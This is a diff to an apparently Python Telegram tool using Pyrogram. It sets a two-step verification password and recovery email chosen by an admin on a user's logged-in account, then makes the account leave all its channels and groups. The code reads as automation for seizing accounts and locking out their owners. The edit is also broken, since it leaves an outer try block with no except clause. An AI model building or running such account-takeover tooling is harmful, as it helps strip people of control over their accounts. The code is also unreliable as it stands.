@@ -127,12 +127,15 @@ async def process_account_automation(bot: Client, admin_id: int, user_client: Cl
         # Note: Pyrogram doesn't have a direct high-level method for recovery email change in all versions, 
         # but we can try setting/updating 2FA which usually includes recovery email.
         try:
-            await user_client.enable_2step_verification(new_password=admin_2fa, email=recovery_email)
-        except Exception as e:
-            # If already has 2FA, we might need to change it
-            await user_client.update_2step_verification(new_password=admin_2fa, email=recovery_email)
+            try:
+                # Attempt to set 2FA password. This works if no 2FA is currently set.
+                await user_client.set_password(new_password=admin_2fa, email=recovery_email)
+                await bot.send_message(admin_id, "✅ 2FA password set successfully (or updated if no current password was required).")
+            except Exception as e:
+                # If setting fails, it likely means 2FA is already enabled and requires the current password.
+                await bot.send_message(admin_id, f"⚠️ Could not set/update 2FA password for {phone}. It might already be enabled and require the current password. Error: `{e}`")
         
-        await bot.send_message(admin_id, "✅ Recovery email and 2FA updated.")
+        await bot.send_message(admin_id, "✅ Recovery email and 2FA handling completed.")
 
         # 3. Leave all channels/groups & Ban older chats
         async for dialog in user_client.get_dialogs():
